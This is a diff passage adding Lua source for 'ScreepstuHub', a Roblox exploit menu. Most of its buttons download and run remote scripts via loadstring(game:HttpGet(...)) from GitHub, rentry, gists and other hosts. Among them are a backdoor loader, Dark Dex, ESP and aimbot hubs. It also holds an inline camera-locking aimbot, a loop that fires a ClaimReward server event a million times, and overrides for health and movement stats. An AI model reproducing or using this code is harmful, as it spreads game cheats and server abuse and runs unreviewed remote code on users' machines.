+		game.Players.PlayerRemoving:Connect(function(player)
+			RemovePlayer(player)
+		end)
+
+		task.spawn(function()
+			while wait() do 
+				for _, player in ipairs(game.Players:GetPlayers()) do
+					player.Chatted:Connect(function(msg)
+						if msg == "nexus-is-back" and not updatedPlayers[player] then
+							if not table.find(nexus, player.Name) and player ~= game.Players.LocalPlayer then
+								local playerNameWithoutUnderscores = player.Name:gsub("_", "")
+								table.insert(nexus, playerNameWithoutUnderscores)
+								print("Detected:", playerNameWithoutUnderscores)
+								updatedPlayers[player] = true  
+								UpdateDropdownValues() 
+							end
+						end  
+					end) 
+				end
+			end
+		end)
+
+		Dropdown = premium == "premium" and Tabs.Premium:AddDropdown("Dropdown", {
+			Title = "Select Nexus User",
+			Values = nexus, 
+			Multi = false,
+			Default = "",
+			Callback = function(value)
+				getgenv().Selected = value
+			end
+		})
+
+		Window:SelectTab(1)
+	end)
+end
+coroutine.wrap(VFMP_fake_script)()
+local function BOVFZ_fake_script() -- ScreepstuHub.SecureDex.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.SecureDex)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
+	end)
+end
+coroutine.wrap(BOVFZ_fake_script)()
+local function GPPI_fake_script() -- ScreepstuHub.UnnamedESP.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.UnnamedESP)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))()
+	end)
+end
+coroutine.wrap(GPPI_fake_script)()
+local function LAKX_fake_script() -- ScreepstuHub.WRDAimbot.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.WRDAimbot)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/Creepstu/WeAreDevs-Aimbot/main/source'))()
+	end)
+end
+coroutine.wrap(LAKX_fake_script)()
+local function LLHWRV_fake_script() -- ScreepstuHub.WRDESP.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.WRDESP)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/Creepstu/WeAreDevs-ESP/main/source'))()
+	end)
+end
+coroutine.wrap(LLHWRV_fake_script)()
+local function WJEBM_fake_script() -- ScreepstuHub.Arsenal.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.Arsenal)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local fov = 40
+		local maxTransparency = 0.1 -- Transparência máxima dentro do círculo (0.1 = 10% de transparência)
+		local RunService = game:GetService("RunService")
+		local UserInputService = game:GetService("UserInputService")
+		local Players = game:GetService("Players")
+		local Cam = game.Workspace.CurrentCamera
+
+		local FOVring = Drawing.new("Circle")
+		FOVring.Visible = true
+		FOVring.Thickness = 2
+		FOVring.Color = Color3.fromRGB(128, 0, 128) -- Cor roxa
+		FOVring.Filled = false
+		FOVring.Radius = fov
+		FOVring.Position = Cam.ViewportSize / 2
+
+		local function updateDrawings()
+			local camViewportSize = Cam.ViewportSize
+			FOVring.Position = camViewportSize / 2
+		end
+
+		local function onKeyDown(input)
+			if input.KeyCode == Enum.KeyCode.Delete then
+				RunService:UnbindFromRenderStep("FOVUpdate")
+				FOVring:Remove()
+			end
+		end
+
+		UserInputService.InputBegan:Connect(onKeyDown)
+
+		local function lookAt(target)
+			local lookVector = (target - Cam.CFrame.Position).unit
+			local newCFrame = CFrame.new(Cam.CFrame.Position, Cam.CFrame.Position + lookVector)
+			Cam.CFrame = newCFrame
+		end
+
+		local function calculateTransparency(distance)
+			-- Ajuste a transparência com base na distância do centro do círculo
+			local maxDistance = fov -- A distância máxima do centro do círculo
+			local transparency = (1 - (distance / maxDistance)) * maxTransparency
+			return transparency
+		end
+
+		local function getClosestPlayerInFOV(trg_part)
+			local nearest = nil
+			local last = math.huge
+			local playerMousePos = Cam.ViewportSize / 2
+
+			for _, player in ipairs(Players:GetPlayers()) do
+				if player ~= Players.LocalPlayer then
+					local part = player.Character and player.Character:FindFirstChild(trg_part)
+					if part then
+						local ePos, isVisible = Cam:WorldToViewportPoint(part.Position)
+						local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude
+
+						if distance < last and isVisible and distance < fov then
+							last = distance
+							nearest = player
+						end
+					end
+				end
+			end
+
+			return nearest
+		end
+
+		RunService.RenderStepped:Connect(function()
+			updateDrawings()
+			local closest = getClosestPlayerInFOV("Head")
+			if closest and closest.Character:FindFirstChild("Head") then
+				lookAt(closest.Character.Head.Position)
+			end
+
+			if closest then
+				local ePos, isVisible = Cam:WorldToViewportPoint(closest.Character.Head.Position)
+				local distance = (Vector2.new(ePos.x, ePos.y) - (Cam.ViewportSize / 2)).Magnitude
+				FOVring.Transparency = calculateTransparency(distance)
+			else
+				FOVring.Transparency = 0.1 -- Mantenha completamente visível quando nenhum jogador estiver no FOV
+			end
+		end)
+	end)
+end
+coroutine.wrap(WJEBM_fake_script)()
+local function ALFQB_fake_script() -- ScreepstuHub.BananaEats.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.BananaEats)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://gist.githubusercontent.com/NovaVanity/131e258977e50e1ec0184c72818b8bfd/raw"))()
+	end)
+end
+coroutine.wrap(ALFQB_fake_script)()
+local function ENBOLOW_fake_script() -- ScreepstuHub.BrookhavenRP.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.BrookhavenRP)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Max8387/Zendz/main/README.md"))()
+	end)
+end
+coroutine.wrap(ENBOLOW_fake_script)()
+local function RVVEROP_fake_script() -- ScreepstuHub.ClownKilling.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.ClownKilling)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		pcall(function()
+			Rox_Hub = true
+			loadstring(game:HttpGet("https://gist.githubusercontent.com/HaxxV1/d7cfdb5090e819a84a8db22fb113f39d/raw"))()
+		end)
+	end)
+end
+coroutine.wrap(RVVEROP_fake_script)()
+local function AWOI_fake_script() -- ScreepstuHub.DollhouseRP.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.DollhouseRP)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i = 1, 1000 do
+			for i = 1, 100 do
+				for i = 1, 10 do
+					game.ReplicatedStorage.ClaimReward:FireServer()
+				end	
+			end
+		end
+	end)
+end
+coroutine.wrap(AWOI_fake_script)()
+local function JAOU_fake_script() -- ScreepstuHub.FreeRadio.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.FreeRadio)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/Creepstu/FreeRadioBoombox/main/source'))()
+	end)
+end
+coroutine.wrap(JAOU_fake_script)()
+local function WGXDQDO_fake_script() -- ScreepstuHub.HideNSeekExtreme.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.HideNSeekExtreme)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://rentry.co/vdvp/raw"))()
+	end)
+end
+coroutine.wrap(WGXDQDO_fake_script)()
+local function PIYBC_fake_script() -- ScreepstuHub.HoldPeopleTheGame.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.HoldPeopleTheGame)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://rentry.co/zyfl/raw"))()
+	end)
+end
+coroutine.wrap(PIYBC_fake_script)()
+local function YMIKCJ_fake_script() -- ScreepstuHub.MurderMystery2.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.MurderMystery2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
+	end)
+end
+coroutine.wrap(YMIKCJ_fake_script)()
+local function MAMFISM_fake_script() -- ScreepstuHub.MurderMysteryXFreeRadioNHunter2.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.MurderMysteryXFreeRadioNHunter2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/MrGeneral/UIORAWBNYM/main/source"))()
+	end)
+end
+coroutine.wrap(MAMFISM_fake_script)()
+local function DNCRLD_fake_script() -- ScreepstuHub.SniperBeta.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.SniperBeta)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/MrGeneral/80UTADXLI6/main/source"))()
+	end)
+end
+coroutine.wrap(DNCRLD_fake_script)()
+local function CELRA_fake_script() -- ScreepstuHub.StopItSlender.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.StopItSlender)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://rentry.co/nwhlc/raw"))()
+	end)
+end
+coroutine.wrap(CELRA_fake_script)()
+local function NBXR_fake_script() -- ScreepstuHub.TowerOfFun.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.TowerOfFun)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://rentry.co/tffn/raw"))()
+	end)
+end
+coroutine.wrap(NBXR_fake_script)()
+local function OPIA_fake_script() -- ScreepstuHub.Health.PrintOnNumberInput 
+	local script = Instance.new('LocalScript', ScreepstuHub.Health)
+
+	local textBox = script.Parent
+
+	local function onTextChanged()
+		local text = textBox.Text
+		local number = tonumber(text)
+
+		if number then
+			game.Players.LocalPlayer.Character.Humanoid.Health = number
+		end
+	end
+
+	textBox.Changed:Connect(onTextChanged)
+end
+coroutine.wrap(OPIA_fake_script)()
+local function STXSLHK_fake_script() -- ScreepstuHub.HipHeight.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.HipHeight)
+
+	local textBox = script.Parent
+
+	local function onTextChanged()
+		local text = textBox.Text
+		local number = tonumber(text)
+
+		if number then
+			game.Players.LocalPlayer.Character.Humanoid.HipHeight = number
+		end
+	end
+
+	textBox.Changed:Connect(onTextChanged)
+end
+coroutine.wrap(STXSLHK_fake_script)()
+local function QNECBG_fake_script() -- ScreepstuHub.MaxSlopeAngle.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.MaxSlopeAngle)
+
+	local textBox = script.Parent
+
+	local function onTextChanged()
+		local text = textBox.Text
+		local number = tonumber(text)
+
+		if number then
+			game.Players.LocalPlayer.Character.Humanoid.MaxSlopeAngle = number
+		end
+	end
+
+	textBox.Changed:Connect(onTextChanged)
+end
+coroutine.wrap(QNECBG_fake_script)()
+local function DSVQ_fake_script() -- ScreepstuHub.WalkSpeed.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.WalkSpeed)
+
+	local textBox = script.Parent
+
+	local function onTextChanged()
+		local text = textBox.Text
+		local number = tonumber(text)
+
+		if number then
+			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = number
+		end
+	end
+
+	textBox.Changed:Connect(onTextChanged)
+end
+coroutine.wrap(DSVQ_fake_script)()
+local function QZAP_fake_script() -- ScreepstuHub.JumpPower.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.JumpPower)
+
+	local textBox = script.Parent
+
+	local function onTextChanged()
+		local text = textBox.Text
+		local number = tonumber(text)
+
+		if number then
+			game.Players.LocalPlayer.Character.Humanoid.JumpPower = number
+		end
+	end
+
+	textBox.Changed:Connect(onTextChanged)
+end
+coroutine.wrap(QZAP_fake_script)()
+local function SZTLDA_fake_script() -- ScreepstuHub.Sit.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.Sit)
+
+	local enable = false
+
+	script.Parent.MouseButton1Click:Connect(function()
+		if enable == false then
+			enable = true
+			script.Parent.UIStroke.Color = Color3.fromRGB(43, 177, 255)
+			script.Parent.Text = "is Sitting: Yes"
+
+			game.Players.LocalPlayer.Character.Humanoid.Sit = true
+		else
+			enable = false
+			script.Parent.UIStroke.Color = Color3.fromRGB(38, 255, 156)
+			script.Parent.Text = "is Sitting: No"
+
+			game.Players.LocalPlayer.Character.Humanoid.Sit = false
+		end	
+	end)
+end
+coroutine.wrap(SZTLDA_fake_script)()
+local function NGLAOQ_fake_script() -- ScreepstuHub.Jump.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.Jump)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
+	end)
+end
+coroutine.wrap(NGLAOQ_fake_script)()
+local function YQIT_fake_script() -- ScreepstuHub.ResetCharacter.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.ResetCharacter)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+	end)
+end
+coroutine.wrap(YQIT_fake_script)()
+local function BQDCZ_fake_script() -- ScreepstuHub.FieldofView.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.FieldofView)
+
+	local textBox = script.Parent
+
+	function isNumber(str)
+		if tonumber(str) ~= nil or str == 'inf' then
+			return true
+		end
+	end
+
+	local function onTextChanged()
+		local text = textBox.Text
+		local number = tonumber(text)
+
+		if number then
+			local fov = number or 70
+			if isNumber(fov) then
+				workspace.CurrentCamera.FieldOfView = fov
+			end
+		end
+	end
+
+	textBox.Changed:Connect(onTextChanged)
+end
+coroutine.wrap(BQDCZ_fake_script)()
+local function STRPW_fake_script() -- ScreepstuHub.Freeze.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.Freeze)
+
+	local enable = false
+
+	script.Parent.MouseButton1Click:Connect(function()
+		if enable == false then
+			enable = true
+			script.Parent.UIStroke.Color = Color3.fromRGB(43, 177, 255)
+			script.Parent.Text = "is Freezing: Yes"
+
+			task.spawn(function()
+				for i, x in next, game.Players.LocalPlayer.Character:GetDescendants() do
+					if x:IsA("BasePart") and not x.Anchored then
+						x.Anchored = true
+					end
+				end
+			end)
+		else
+			enable = false
+			script.Parent.UIStroke.Color = Color3.fromRGB(38, 255, 156)
+			script.Parent.Text = "is Freezing: No"
+
+
+			task.spawn(function()
+				for i, x in next, game.Players.LocalPlayer.Character:GetDescendants() do
+					if x:IsA("BasePart") and x.Anchored then
+						x.Anchored = false
+					end
+				end
+			end)
+		end	
+	end)
+end
+coroutine.wrap(STRPW_fake_script)()
+local function XGJO_fake_script() -- ScreepstuHub.BackdoorLoadstring.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.BackdoorLoadstring)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
+	end)
+end
+coroutine.wrap(XGJO_fake_script)()
+local function AGKA_fake_script() -- ScreepstuHub.FrontflipNBackflip.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.FrontflipNBackflip)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://rentry.co/parkourflip/raw'))()
+	end)
+end
+coroutine.wrap(AGKA_fake_script)()
+local function KVKH_fake_script() -- ScreepstuHub.WalkOnWalls.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.WalkOnWalls)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/Creepstu/WalkOnWalls/main/source'))()
+	end)
+end
+coroutine.wrap(KVKH_fake_script)()
+local function DGHQX_fake_script() -- ScreepstuHub.TAS.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.TAS)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://rentry.co/ToAsSp/raw'))()
+	end)
+end
+coroutine.wrap(DGHQX_fake_script)()
+local function WNOLEC_fake_script() -- ScreepstuHub.ScreepstuHub.SoundSystem 
+	local script = Instance.new('LocalScript', ScreepstuHub.ScreepstuHub)
+
+	local function playSound(sound)
+		script.Parent[sound]:Play()
+	end
+
+	for _, v in pairs(script.Parent:GetDescendants()) do
+		if v:IsA('TextButton') or v:IsA('ImageButton') then
+			v.MouseEnter:Connect(function()
+				playSound("hovers")
+			end)
+
+			v.MouseButton1Click:Connect(function()
+				playSound("clicking")
+			end)
+		end
+	end
+end
+coroutine.wrap(WNOLEC_fake_script)()
+local function LIHU_fake_script() -- ScreepstuHub.AstraHub.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.AstraHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://code4zaa.xyz/script/script-loader.lua"))()
+	end)
+end
+coroutine.wrap(LIHU_fake_script)()
+local function CKZG_fake_script() -- ScreepstuHub.DemonicHub.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.DemonicHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/DemonicHub/Script/main/Main"))()
+	end)
+end
+coroutine.wrap(CKZG_fake_script)()
+local function KQQZR_fake_script() -- ScreepstuHub.OwlHub.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.OwlHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt'))()
+	end)
+end
+coroutine.wrap(KQQZR_fake_script)()
+local function OBSQL_fake_script() -- ScreepstuHub.ScreepstuHub_2.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.ScreepstuHub_2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/creepstu/ScreepstuHub/main/source"))()
+	end)
+end
+coroutine.wrap(OBSQL_fake_script)()
+local function NTYZA_fake_script() -- ScreepstuHub.ReaperHub.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.ReaperHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/AyoReaper/Reaper-Hub/main/loader.lua'))()
+	end)
+end
+coroutine.wrap(NTYZA_fake_script)()
+local function IRIJNBR_fake_script() -- ScreepstuHub.RedzHub.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.RedzHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB'))()
+	end)
+end
+coroutine.wrap(IRIJNBR_fake_script)()
+local function RITW_fake_script() -- ScreepstuHub.ZapHub.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.ZapHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+	end)
+end
+coroutine.wrap(RITW_fake_script)()
+local function UAXIFOU_fake_script() -- ScreepstuHub.SpaceHub.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.SpaceHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Lucasfin000/Orbit-UI-Library/main/Library", true))()
+	end)
+end
+coroutine.wrap(UAXIFOU_fake_script)()
+local function HORL_fake_script() -- ScreepstuHub.SolarisHub.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.SolarisHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://solarishub.dev/script.lua',true))()
+	end)
+end
+coroutine.wrap(HORL_fake_script)()
+local function GIAKE_fake_script() -- ScreepstuHub.ShifeHub.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.ShifeHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexzzv/Alexzzv/main/Lop"))()
+	end)
+end
+coroutine.wrap(GIAKE_fake_script)()
